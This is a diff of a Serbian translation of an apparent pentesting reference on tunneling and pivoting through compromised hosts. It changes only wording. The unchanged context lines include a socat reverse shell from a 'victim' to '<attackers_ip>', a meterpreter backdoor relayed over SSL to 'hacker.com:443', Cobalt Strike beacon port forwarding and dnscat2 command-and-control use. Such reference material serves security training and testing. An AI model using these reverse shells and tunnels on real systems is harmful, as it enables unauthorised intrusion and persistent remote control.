@@ -55,9 +55,9 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Obrnuto prosleđivanje portova
+### Reverse Port Forwarding
 
-Ovo je korisno za dobijanje obrnuto shell-ova sa internih hostova kroz DMZ do vašeg hosta:
+Ovo je korisno za dobijanje obrnute ljuske sa internih hostova kroz DMZ do vašeg hosta:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -90,7 +90,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Možete **tunelovati** putem **ssh** sav **saobraćaj** ka **podmreži** kroz host.\
-Na primer, proslediti sav saobraćaj koji ide ka 10.10.10.0/24
+Na primer, prosleđivanje savremenog saobraćaja koji ide ka 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -145,16 +145,16 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje na Team Server i odatle na navedeni host:port
+> U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje na Team Server, a odatle na navedeni host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 Da se napomene:
 
-- Beaconov obrnuti port forwarding je dizajniran da **tuneluje saobraćaj ka Team Server-u, a ne za preusmeravanje između pojedinačnih mašina**.
-- Saobraćaj je **tunelovan unutar Beaconovog C2 saobraćaja**, uključujući P2P linkove.
-- **Administratorske privilegije nisu potrebne** za kreiranje obrnuti port forward-a na visokim portovima.
+- Beacon-ov obrnuti port forwarding je dizajniran da **tuneluje saobraćaj ka Team Server-u, a ne za preusmeravanje između pojedinačnih mašina**.
+- Saobraćaj je **tunelovan unutar Beacon-ovog C2 saobraćaja**, uključujući P2P linkove.
+- **Administratorske privilegije nisu potrebne** za kreiranje obrnuti port forwarding na visokim portovima.
 
 ### rPort2Port lokalno
 
@@ -272,11 +272,11 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Port2Port preko socks
+### Port2Port kroz socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter preko SSL Socat
+### Meterpreter kroz SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
+Možete zaobići **neautentifikovani proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -320,9 +320,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-To je kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).
+To je kao konzolna verzija PuTTY (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo imali obrnutu vezu. Zatim, da bismo prosledili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da uspostavimo obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -366,7 +366,7 @@ netstat -antb | findstr 1080
 ```
 Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da proksirate saobraćaj kroz tu port.**
 
-## Proksiranje Windows GUI aplikacija
+## Proksirajte Windows GUI aplikacije
 
 Možete naterati Windows GUI aplikacije da prolaze kroz proksi koristeći [**Proxifier**](https://www.proxifier.com/).\
 U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega preko napadačkog porta 2222.\
+Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -440,15 +440,15 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Promena proxychains DNS
+#### Promena proxychains DNS-a
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **defaultu** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **definiciji**, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunneling
+## ICMP Tunelovanje
 
 ### Hans
 
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**\
-&#xNAN;_&#x45;xposition URI su kao:_ **UID.ngrok.io**
+_&#x45;xposition URI su kao:_ **UID.ngrok.io**
 
 ### Instalacija
 
@@ -528,7 +528,7 @@ Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.
 Otvara 3 tunela:
 
 - 2 TCP
-- 1 HTTP sa izlaganjem statičkih fajlova iz /tmp/httpbin/
+- 1 HTTP sa statičkim fajlovima izloženim iz /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
